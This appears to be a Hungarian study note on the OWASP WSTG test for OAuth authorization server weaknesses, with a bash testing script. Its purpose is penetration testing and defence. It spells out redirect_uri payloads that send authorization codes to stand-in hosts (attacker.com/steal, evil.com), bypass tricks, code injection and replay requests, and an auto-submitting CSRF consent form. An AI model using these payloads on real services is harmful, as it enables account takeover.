# WSTG-AUTHZ-06: OAuth Authorization Server Weaknesses Tesztelése

## Mi a fejezet lényege?

Az **OAuth Authorization Server (AS)** validation hiányosságai **account takeover**-hez vezetnek. **Insufficient redirect_uri validation** (redirect to attacker), **authorization code injection**, **PKCE downgrade**, vagy **weak token lifetime** mind AS weakness-ek. **Code replay**, **CSRF consent page**, vagy **clickjacking** attack-ok sikeres kihasználása az AS proper validation-jétől függ.

---

## Testing Területek

### 1. **Redirect URI Validation**
### 2. **Authorization Code Injection**
### 3. **PKCE Downgrade**
### 4. **CSRF on Consent Page**
### 5. **Clickjacking**
### 6. **Token Lifetime**

---

## 1. Insufficient Redirect URI Validation

### Attack:

**Normal authorization:**
```
https://as.example.com/authorize?
  client_id=legit-client
  &redirect_uri=https://client.example.com/callback
```

**Attacker modifies redirect_uri:**
```
https://as.example.com/authorize?
  client_id=legit-client
  &redirect_uri=https://attacker.com/steal
```

**If AS accepts:** Authorization code sent to attacker!

---

### Testing:

```bash
# Capture authorization request
GET /authorize?
  redirect_uri=https://client.example.com/callback
  &client_id=example-client
  &response_type=code
  &state=xyz

# Modify redirect_uri to attacker domain
GET /authorize?
  redirect_uri=https://evil.com/steal
  &client_id=example-client
  &response_type=code
  &state=xyz

# If AS redirects to evil.com → Vulnerable!
```

---

### Bypass Techniques:

```bash
# Original: https://client.example.com

# Try subdomains
redirect_uri=https://attacker.client.example.com

# Try path traversal
redirect_uri=https://client.example.com@attacker.com

# Try parameter pollution
redirect_uri=https://client.example.com&redirect_uri=https://attacker.com

# Try open redirect
redirect_uri=https://client.example.com/redirect?url=https://attacker.com
```

---

## 2. Authorization Code Injection

### Concept:
Use authorization code **meant for different user/client**.

---

### Test Public Client:

**Step 1 - Get code for User A:**
```bash
# Login as Alice
# Capture authorization code
code_alice=abc123
```

**Step 2 - Use in User B's flow:**
```bash
# Login as Bob
# Intercept token exchange
POST /oauth/token HTTP/1.1

{
  "client_id": "example-client",
  "code": "abc123",  ← Alice's code!
  "grant_type": "authorization_code",
  "redirect_uri": "https://client.example.com"
}

# If successful → Bob's session has Alice's access!
```

---

### Test Confidential Client:

**Step 1 - Capture Alice's code:**
```
# Start OAuth flow as Alice
# Get code: xyz789
# Don't complete flow
```

**Step 2 - Inject into Bob's flow:**
```bash
# Start OAuth flow as Bob
# Intercept callback
GET /callback?code=xyz789&state=bob_state

# If successful → Bob logged in as Alice!
```

---

### Code Replay Test:

```bash
# Use authorization code
curl -X POST /oauth/token \
  -d "code=abc123&grant_type=authorization_code&..."

# Returns: access_token

# Try SAME code again
curl -X POST /oauth/token \
  -d "code=abc123&grant_type=authorization_code&..."

# Should fail!
# If succeeds again → Code replay vulnerability!
```

---

## 3. PKCE Downgrade Attack

### Concept:
Remove PKCE parameters to weaken security.

---

### Test #1: Omit code_challenge

**Normal request:**
```http
GET /authorize?
  response_type=code
  &code_challenge=E9Melhoa...
  &code_challenge_method=S256
```

**Attack: Remove PKCE:**
```bash
curl "https://as.example.com/authorize?\
response_type=code&\
client_id=public-client&\
redirect_uri=https://app.com/callback"

# NO code_challenge!

# If AS accepts → PKCE downgrade possible!
```

---

### Test #2: Empty code_challenge

```bash
curl "https://as.example.com/authorize?\
code_challenge=&\
code_challenge_method=S256&\
response_type=code&..."

# Empty code_challenge

# If AS accepts → Vulnerable!
```

---

### Test #3: Wrong code_verifier

**Token exchange:**
```bash
# Get code with PKCE
code=xyz123

# Try wrong code_verifier
curl -X POST /oauth/token \
  -d '{
    "code": "xyz123",
    "code_verifier": "wrong_verifier",
    "grant_type": "authorization_code"
  }'

# Should fail!
# If succeeds → code_verifier not validated!
```

---

### Test #4: Omit code_verifier

```bash
curl -X POST /oauth/token \
  -d '{
    "code": "xyz123",
    "grant_type": "authorization_code"
  }'

# NO code_verifier!

# Should fail if code was generated with PKCE
# If succeeds → PKCE not enforced!
```

---

## 4. CSRF on Consent Page

### Concept:
Force user to grant access to attacker's client.

---

### Attack:

**Attacker crafts consent URL:**
```html
<!-- Attacker's page -->
<form action="https://as.example.com/u/consent" method="POST">
  <input name="state" value="attacker_state">
  <input name="scope[]" value="profile">
  <input name="scope[]" value="email">
  <input name="action" value="accept">
</form>
<script>document.forms[0].submit();</script>
```

**Victim visits page:** Consent auto-submitted!

---

### Testing:

```bash
# Capture consent POST
POST /u/consent HTTP/1.1

state=xyz123
&scope[]=profile
&scope[]=email
&action=accept

# Remove or modify state parameter
POST /u/consent HTTP/1.1

state=tampered_or_removed
&scope[]=profile
&action=accept

# If successful → CSRF vulnerability!
```

---

## 5. Clickjacking on Consent Page

### Test:

**Create HTML:**
```html
<html>
<head><title>Clickjacking Test</title></head>
<body>
  <iframe 
    src="https://as.example.com/authorize?client_id=test&..."
    width="500" 
    height="500">
  </iframe>
</body>
</html>
```

**Load in browser:**
```
If consent page loads in iframe → Clickjacking possible!
```

---

**Check X-Frame-Options:**
```bash
curl -I https://as.example.com/authorize

# Should have:
X-Frame-Options: DENY
# OR
X-Frame-Options: SAMEORIGIN
# OR
Content-Security-Policy: frame-ancestors 'none'
```

---

## 6. Token Lifetime Testing

### Access Token Lifetime:

**Good:** 5-15 minutes  
**Bad:** Hours or days

---

**Testing:**
```bash
# Get access token
curl -X POST /oauth/token ... > response.json

# Extract token
token=$(cat response.json | jq -r .access_token)

# Use immediately
curl -H "Authorization: Bearer $token" /api/userinfo
# → 200 OK

# Wait 10 minutes
sleep 600

# Try again
curl -H "Authorization: Bearer $token" /api/userinfo
# Should fail (401)!
# If still works → Token lifetime too long!

# Wait 30 minutes
sleep 1800

# Try again
curl -H "Authorization: Bearer $token" /api/userinfo
# Must fail by now!
```

---

### Refresh Token Reuse:

**Should be:** Single-use  
**Testing:**

```bash
# Get refresh token
refresh_token=eyJhbGc...

# Use once
curl -X POST /oauth/token \
  -d "grant_type=refresh_token&refresh_token=$refresh_token"
# Returns: new access token + new refresh token

# Try same refresh token again
curl -X POST /oauth/token \
  -d "grant_type=refresh_token&refresh_token=$refresh_token"
# Should fail!
# If succeeds → Refresh token reusable (vulnerable!)
```

---

### Refresh Token Theft Detection:

**Mechanism:** If old refresh token used, invalidate ALL.

**Testing:**
```bash
# Step 1: Get refresh token
refresh1=abc123

# Step 2: Use it
curl -d "refresh_token=$refresh1" /token
# Returns: access_token + refresh2=def456

# Step 3: Use refresh2
curl -d "refresh_token=def456" /token
# Returns: access_token + refresh3=ghi789

# Step 4: Try OLD refresh1 (should be invalid)
curl -d "refresh_token=$refresh1" /token
# Should fail

# Step 5: Try refresh3 (latest)
curl -d "refresh_token=ghi789" /token
# Should also fail if theft detection works!
# (All tokens invalidated after old token used)
```

---

## Praktikus Testing Script

```bash
#!/bin/bash

echo "=== OAuth AS Testing ==="

# Test 1: Redirect URI
echo "[*] Testing redirect_uri validation"
curl -s "https://as.example.com/authorize?\
client_id=test&\
redirect_uri=https://evil.com" | grep -q "evil.com"
if [ $? -eq 0 ]; then
  echo "[!] VULNERABLE: redirect_uri not validated"
fi

# Test 2: Code replay
echo "[*] Testing code replay"
code="test_code_123"
result1=$(curl -s -X POST /oauth/token -d "code=$code")
result2=$(curl -s -X POST /oauth/token -d "code=$code")
if echo "$result2" | grep -q "access_token"; then
  echo "[!] VULNERABLE: Code replayable"
fi

# Test 3: PKCE downgrade
echo "[*] Testing PKCE downgrade"
curl -s "https://as.example.com/authorize?\
response_type=code&\
client_id=public-client" | grep -q "code="
if [ $? -eq 0 ]; then
  echo "[!] VULNERABLE: PKCE not enforced"
fi

# Test 4: Token lifetime
echo "[*] Testing access token lifetime"
token="eyJhbGc..."
sleep 1800  # 30 min
curl -s -H "Authorization: Bearer $token" /api/userinfo | grep -q "200 OK"
if [ $? -eq 0 ]; then
  echo "[!] WARNING: Token lifetime too long"
fi
```

---

## Fontos Toolok

- **Burp Suite** - Intercept & modify
- **ZAP** - OAuth testing
- **EsPReSSO** - Burp OAuth extension
- **curl** - Manual testing
- **jwt.io** - JWT inspection

---

## Fontos Megjegyzések

✅ **Strict redirect_uri** validation  
✅ **Code single-use** only  
✅ **PKCE mandatory** for public clients  
✅ **Access token: 5-15 min**  
✅ **Refresh token: single-use**  
❌ **redirect_uri=attacker.com** accepted!  
❌ **Code replay** possible!  
❌ **PKCE removal** accepted!  
⚠️ **State parameter** = anti-CSRF!  
⚠️ **X-Frame-Options** protect consent!  

---

**Összefoglalva:** **AS weakness testing** = parameter validation + token security. **Redirect URI**: test with attacker domain + bypass techniques. **Code injection**: use Alice's code in Bob's flow. **PKCE downgrade**: omit code_challenge or code_verifier. **CSRF**: tamper state on consent. **Clickjacking**: iframe consent page. **Token lifetime**: access token 5-15 min, refresh token single-use + theft detection!
